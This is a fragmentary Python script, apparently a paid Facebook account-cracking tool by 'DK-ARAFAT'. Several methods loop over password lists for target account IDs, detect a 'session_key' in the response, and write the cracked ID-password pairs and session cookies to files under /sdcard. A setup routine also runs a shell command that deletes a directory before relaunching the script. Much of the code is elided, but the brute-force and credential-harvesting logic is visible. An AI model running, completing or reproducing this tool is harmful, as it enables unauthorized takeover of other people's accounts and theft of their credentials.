...
def Setup():
	try:
		...
		if '8.7.2' in httpx.get(url).text:
			...
			time.sleep(1)
			os.system('rm -rf New && python ARAFAT.py')
			exit()
...
def clear():
	os.system('xdg-open https://https://www.facebook.com/H7K4R')
	print(logo)
logo=("""\033[1;37m

                      __   _______   _  _    ___  _  _   
     /\              / _| |__   __| | || |  / _ \| || |  
...
----------------------------------------------
 Author    : DK-ARAFAT
 Status    : PAID
 Version   : 5.6.7 \033[1;37m
 ok ids will be saved in ARAFAT folder
----------------------------------------------""")
def line():
	print(f'\033[1;37m------------------------------------------------')
	...
	try:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				oks.append(ids)
				open('/sdcard/ARAFAT/-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/ARAFAT-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m2(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ARAFAT-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			#	open('/sdcard/AKING/AKING-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				#cookie = 'Error'
				#open('/sdcard/ARAFAT-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break'''
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m3(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ARAFAT-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
